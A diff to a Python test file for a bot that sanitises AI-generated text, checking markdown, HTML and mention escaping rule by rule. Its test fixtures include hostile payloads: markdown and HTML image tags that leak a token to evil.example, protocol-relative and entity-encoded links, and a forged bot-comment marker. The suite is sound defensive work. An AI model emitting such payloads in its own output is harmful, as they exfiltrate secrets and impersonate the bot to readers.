@@ -574,6 +574,31 @@ def test_ai_ledger_round_trip_and_hostile_input():
     }
 
 
+ZWSP = "\u200b"
+
+
+def _sanitize_model(text, max_chars=4000):
+    """Python model of prod-igy.js `sanitizeAiText`, rule for rule, in order.
+
+    The tests below pin each JS line verbatim *and* exercise this model, so a
+    rule deleted from the JS fails a pin and a rule that stops working fails
+    the behaviour. Keep the two in step.
+    """
+    s = "" if text is None else str(text)
+    s = s.replace("&", "&amp;")
+    s = s.replace("<", "&lt;")
+    s = re.sub(r"--(!?)>", r"--\1&gt;", s)
+    s = re.sub(r"@(?=[A-Za-z0-9])", "@" + ZWSP, s)
+    s = s.replace("![", "!" + ZWSP + "[")
+    s = s.replace("](", "]" + ZWSP + "(")
+    s = s.replace("]:", "]" + ZWSP + ":")
+    s = re.sub(r"/(?=/)", "/" + ZWSP, s)
+    s = re.sub(r"\bwww\.", lambda m: m.group(0)[:3] + ZWSP + ".", s, flags=re.I)
+    if len(s) > max_chars:
+        s = s[:max_chars] + "\u2026 _(truncated)_"
+    return s.strip()
+
+
 def test_ai_text_cannot_forge_a_marker_or_a_mention():
     """Model output is contributor-derived and rendered under the bot identity.
 
@@ -594,20 +619,13 @@ def test_ai_text_cannot_forge_a_marker_or_a_mention():
     # re-implementation would happily keep testing itself.
     body = content[content.index("function sanitizeAiText(") :]
     body = body[: body.index("\n}")]
-    assert "s.replace(/<!--/g, '&lt;!--')" in body, "HTML-comment escaping was removed"
-    assert ".replace(/--(!?)>/g, '--$1&gt;')" in body, "HTML-comment escaping was removed"
+    assert "s.replace(/</g, '&lt;')" in body, "`<` escaping (comment openers) was removed"
+    assert "s.replace(/--(!?)>/g, '--$1&gt;')" in body, "HTML-comment escaping was removed"
     assert "s.replace(/@(?=[A-Za-z0-9])/g, '@' + ZWSP)" in body, "mention defanging was removed"
     assert "s.slice(0, maxChars)" in body, "the length cap was removed"
 
-    zwsp = "​"
-
-    def sanitize(text, max_chars=4000):
-        s = "" if text is None else str(text)
-        s = re.sub(r"--(!?)>", r"--&gt;", s.replace("<!--", "&lt;!--"))
-        s = re.sub(r"@(?=[A-Za-z0-9])", "@" + zwsp, s)
-        if len(s) > max_chars:
-            s = s[:max_chars] + "… _(truncated)_"
-        return s.strip()
+    zwsp = ZWSP
+    sanitize = _sanitize_model
 
     forged = sanitize("nice <!-- prod-igy-bot-comment --> and cc @torvalds @github")
     assert "<!-- prod-igy-bot-comment -->" not in forged
@@ -644,30 +662,20 @@ def test_ai_text_strips_markdown_images_and_links():
     # re-implementation would happily keep testing itself.
     body = content[content.index("function sanitizeAiText(") :]
     body = body[: body.index("\n}")]
-    assert "s.replace(/<img\\b/gi, '&lt;img')" in body, "HTML <img> escaping was removed"
+    assert "s.replace(/&/g, '&amp;')" in body, "`&` escaping (encoded schemes) was removed"
+    assert "s.replace(/</g, '&lt;')" in body, "`<` escaping (raw HTML, <img>) was removed"
     assert "s.replace(/!\\[/g, '!' + ZWSP + '[')" in body, "image-embed defanging was removed"
     assert "s.replace(/\\]\\(/g, ']' + ZWSP + '(')" in body, (
         "link/image-close defanging was removed"
     )
-    assert "s.replace(/\\bhttps?:\\/\\//gi, (m) => m.replace('//', '/' + ZWSP + '/'))" in body, (
-        "bare-URL defanging was removed"
+    assert "s.replace(/\\]:/g, ']' + ZWSP + ':')" in body, "reference-definition defanging removed"
+    assert "s.replace(/\\/(?=\\/)/g, '/' + ZWSP)" in body, "`//` (URL) defanging was removed"
+    assert "s.replace(/\\bwww\\./gi, (m) => m.slice(0, 3) + ZWSP + '.')" in body, (
+        "www. autolink defanging was removed"
     )
 
-    zwsp = "​"
-
-    def sanitize(text, max_chars=4000):
-        s = "" if text is None else str(text)
-        s = re.sub(r"--(!?)>", r"--&gt;", s.replace("<!--", "&lt;!--"))
-        s = re.sub(r"@(?=[A-Za-z0-9])", "@" + zwsp, s)
-        s = re.sub(r"<img\b", "&lt;img", s, flags=re.I)
-        s = s.replace("![", "!" + zwsp + "[")
-        s = s.replace("](", "]" + zwsp + "(")
-        s = re.sub(
-            r"\bhttps?://", lambda m: m.group(0).replace("//", "/" + zwsp + "/"), s, flags=re.I
-        )
-        if len(s) > max_chars:
-            s = s[:max_chars] + "… _(truncated)_"
-        return s.strip()
+    zwsp = ZWSP
+    sanitize = _sanitize_model
 
     # Plain image embed with a token smuggled in the query string.
     img = sanitize("Summary: ![pixel](https://evil.example/p.png?token=SECRET123) done.")
@@ -699,15 +707,54 @@ def test_ai_text_strips_markdown_images_and_links():
     assert "://" not in auto
 
     # HTML <img>, including a mixed-case tag name.
-    html_img = sanitize('Rendered via <img src="https://evil.example/?token=SECRET">.')
-    assert "<img" not in html_img
-    assert "&lt;img" in html_img
+    html_img = sanitize('Rendered via <IMG src="https://evil.example/?token=SECRET">.')
+    assert "<" not in html_img
+    assert "&lt;IMG" in html_img
     assert "://" not in html_img
 
     # Ordinary prose that happens to mention a URL stays readable -- the fix
     # breaks the scheme's `//`, it does not scrub every "http" substring.
     prose = sanitize("Rewrites _lines() to drop the trailing CR.")
     assert prose == "Rewrites _lines() to drop the trailing CR."
+
+
+def test_ai_text_neutralises_protocol_relative_and_entity_encoded_links():
+    """Audit round 1: three forms the https-only / tag-allowlist rules missed.
+
+    - `<a href="//evil.example/login">`: raw HTML with a protocol-relative URL;
+    - `[r]: //evil.example/x`: a reference definition with no scheme at all;
+    - `<a href="HTTPS&#58;//evil.example">`: the scheme's colon as an entity,
+      which the renderer decodes *after* any regex has looked at the text.
+    """
+    content = "\n".join(_read_lines(SCRIPT_PATH))
+    body = content[content.index("function sanitizeAiText(") :]
+    body = body[: body.index("\n}")]
+    # `&` must be escaped before anything that emits an entity, or the
+    # function's own `&lt;` would be re-escaped to `&amp;lt;`.
+    assert body.index("s.replace(/&/g, '&amp;')") < body.index("s.replace(/</g, '&lt;')")
+    # No tag allowlist left to route around.
+    assert "/<img" not in body and "/<!--/" not in body
+
+    sanitize = _sanitize_model
+    live = re.compile(r"//|<[A-Za-z/!?]|&#|\]\(|\]:|!\[|www\.", re.I)
+    for hostile in (
+        '<a href="//evil.example/login">log in</a>',
+        "See [r].\n\n[r]: //evil.example/x",
+        '<a href="HTTPS&#58;//evil.example">x</a>',
+        "[x](HTTPS&#58;//evil.example)",
+        "[r]: HTTPS&#x3a;//evil.example",
+        "<https://evil.example/x> and https:///evil.example and ftp://a.b",
+        "&lt;img src=//x&gt; then &amp;lt;a href=//e&amp;gt;",
+        "go to www.evil.example",
+    ):
+        out = sanitize(hostile)
+        # `&amp;#58;` renders as the literal text `&#58;`, so an escaped `&`
+        # is inert: drop those before looking for anything live.
+        assert not live.search(out.replace("&amp;", "")), (hostile, out)
+
+    # Ordinary prose, `&`, `<` and `>` included, reads the same once rendered.
+    prose = sanitize("Fixes a < b && c > d in Index<T> for R&D.")
+    assert prose == "Fixes a &lt; b &amp;&amp; c > d in Index&lt;T> for R&amp;D."
 
 
 def test_summary_step_does_exactly_two_things():
